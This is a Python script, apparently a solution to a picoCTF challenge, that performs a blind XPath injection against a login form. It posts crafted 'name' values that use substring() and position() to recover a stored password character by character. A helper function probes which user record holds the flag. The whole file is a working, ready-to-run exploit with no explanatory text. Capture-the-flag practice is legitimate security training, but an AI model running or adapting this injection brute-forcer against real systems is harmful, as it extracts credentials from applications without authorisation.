import urllib3, requests, string, sys

url = "http://wily-courier.picoctf.net:63440/"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def bruteforcer():
    user_pos = 3
    total = string.ascii_letters + string.digits + "_{}"
    password = ""
    pass_pos = 1

    while True:
        for char in total:
            xpath_payload = f"' or substring(//user[position()={user_pos}]/pass, {pass_pos}, 1) = '{char}' or '"

            payload = {
                "name": xpath_payload,
                "pass": "a"
            }

            r = requests.post(url, data=payload)

            if "path" in r.text:
                password += char
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                pass_pos += 1
                break

            else:
                sys.stdout.write('\r' + password + char)
                sys.stdout.flush()

        if "}" in password:
            print(password)
            break


def position_identifier():
    for i in range(1, 20):
        print (i)

        xpath_payload = f"' or //user[position()={i}]/pass[starts-with(text(), 'picoCTF')] or '"
        
        payload = {
            "name": xpath_payload,
            "pass": "a"
        }

        r = requests.post(url, data=payload )
        
        if not "path" in r.text:
            print(f"[-] {i} Failed")
        else:
            print(f"[+] {i} Success")


bruteforcer()
